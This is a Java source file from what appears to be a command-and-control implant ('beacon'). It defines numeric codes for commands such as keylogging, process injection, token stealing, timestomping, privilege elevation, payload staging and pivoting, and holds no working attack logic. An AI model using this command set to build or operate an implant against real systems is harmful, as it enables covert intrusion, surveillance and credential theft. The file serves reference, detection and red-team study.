package beacon;

public class Tasks {
   public static final int COMMAND_SPAWN = 1;
   public static final int COMMAND_SHELL = 2;
   public static final int COMMAND_DIE = 3;
   public static final int COMMAND_SLEEP = 4;
   public static final int COMMAND_CD = 5;
   public static final int COMMAND_KEYLOG_START = 6;
   public static final int COMMAND_NOOP = 6;
   public static final int COMMAND_KEYLOG_STOP = 7;
   public static final int COMMAND_CHECKIN = 8;
   public static final int COMMAND_INJECT_PID = 9;
   public static final int COMMAND_UPLOAD = 10;
   public static final int COMMAND_DOWNLOAD = 11;
   public static final int COMMAND_EXECUTE = 12;
   public static final int COMMAND_SPAWN_PROC_X86 = 13;
   public static final int COMMAND_CONNECT = 14;
   public static final int COMMAND_SEND = 15;
   public static final int COMMAND_CLOSE = 16;
   public static final int COMMAND_LISTEN = 17;
   public static final int COMMAND_INJECT_PING = 18;
   public static final int COMMAND_CANCEL_DOWNLOAD = 19;
   public static final int COMMAND_PIPE_ROUTE = 22;
   public static final int COMMAND_PIPE_CLOSE = 23;
   public static final int COMMAND_PIPE_REOPEN = 24;
   public static final int COMMAND_TOKEN_GETUID = 27;
   public static final int COMMAND_TOKEN_REV2SELF = 28;
   public static final int COMMAND_TIMESTOMP = 29;
   public static final int COMMAND_STEAL_TOKEN = 31;
   public static final int COMMAND_PS_LIST = 32;
   public static final int COMMAND_PS_KILL = 33;
   public static final int COMMAND_PSH_IMPORT = 37;
   public static final int COMMAND_RUNAS = 38;
   public static final int COMMAND_PWD = 39;
   public static final int COMMAND_JOB_REGISTER = 40;
   public static final int COMMAND_JOBS = 41;
   public static final int COMMAND_JOB_KILL = 42;
   public static final int COMMAND_INJECTX64_PID = 43;
   public static final int COMMAND_SPAWNX64 = 44;
   public static final int COMMAND_INJECT_PID_PING = 45;
   public static final int COMMAND_INJECTX64_PID_PING = 46;
   public static final int COMMAND_PAUSE = 47;
   public static final int COMMAND_LOGINUSER = 49;
   public static final int COMMAND_LSOCKET_BIND = 50;
   public static final int COMMAND_LSOCKET_CLOSE = 51;
   public static final int COMMAND_STAGE_PAYLOAD = 52;
   public static final int COMMAND_FILE_LIST = 53;
   public static final int COMMAND_FILE_MKDIR = 54;
   public static final int COMMAND_FILE_DRIVES = 55;
   public static final int COMMAND_FILE_RM = 56;
   public static final int COMMAND_STAGE_PAYLOAD_SMB = 57;
   public static final int COMMAND_WEBSERVER_LOCAL = 59;
   public static final int COMMAND_ELEVATE_PRE = 60;
   public static final int COMMAND_ELEVATE_POST = 61;
   public static final int COMMAND_JOB_REGISTER_IMPERSONATE = 62;
   public static final int COMMAND_SPAWN_POWERSHELLX86 = 63;
   public static final int COMMAND_SPAWN_POWERSHELLX64 = 64;
   public static final int COMMAND_INJECT_POWERSHELLX86_PID = 65;
   public static final int COMMAND_INJECT_POWERSHELLX64_PID = 66;
   public static final int COMMAND_UPLOAD_CONTINUE = 67;
   public static final int COMMAND_PIPE_OPEN_EXPLICIT = 68;
   public static final int COMMAND_SPAWN_PROC_X64 = 69;
   public static final int COMMAND_JOB_SPAWN_X86 = 70;
   public static final int COMMAND_JOB_SPAWN_X64 = 71;
   public static final int COMMAND_SETENV = 72;
   public static final int COMMAND_FILE_COPY = 73;
   public static final int COMMAND_FILE_MOVE = 74;
   public static final int COMMAND_PPID = 75;
   public static final int COMMAND_RUN_UNDER_PID = 76;
   public static final int COMMAND_GETPRIVS = 77;
   public static final int COMMAND_EXECUTE_JOB = 78;
   public static final int COMMAND_PSH_HOST_TCP = 79;
   public static final int COMMAND_DLL_LOAD = 80;
   public static final int COMMAND_REG_QUERY = 81;
   public static final int COMMAND_LSOCKET_TCPPIVOT = 82;
   public static final int COMMAND_ARGUE_ADD = 83;
   public static final int COMMAND_ARGUE_REMOVE = 84;
   public static final int COMMAND_ARGUE_LIST = 85;
   public static final int COMMAND_TCP_CONNECT = 86;
   public static final int COMMAND_JOB_SPAWN_TOKEN_X86 = 87;
   public static final int COMMAND_JOB_SPAWN_TOKEN_X64 = 88;
   public static final int COMMAND_SPAWN_TOKEN_X86 = 89;
   public static final int COMMAND_SPAWN_TOKEN_X64 = 90;
   public static final int COMMAND_INJECTX64_PING = 91;
   public static final int COMMAND_BLOCKDLLS = 92;
   public static final int COMMAND_SPAWNAS_X86 = 93;
   public static final int COMMAND_SPAWNAS_X64 = 94;
   public static final int COMMAND_INLINE_EXECUTE = 95;
   public static final int COMMAND_RUN_INJECT_X86 = 96;
   public static final int COMMAND_RUN_INJECT_X64 = 97;
   public static final int COMMAND_SPAWNU_X86 = 98;
   public static final int COMMAND_SPAWNU_X64 = 99;
   public static final int COMMAND_INLINE_EXECUTE_OBJECT = 100;
   public static final int COMMAND_JOB_REGISTER_MSGMODE = 101;
   public static final int COMMAND_LSOCKET_BIND_LOCALHOST = 102;

   public static final long max() {
      return 1048576L;
   }
}
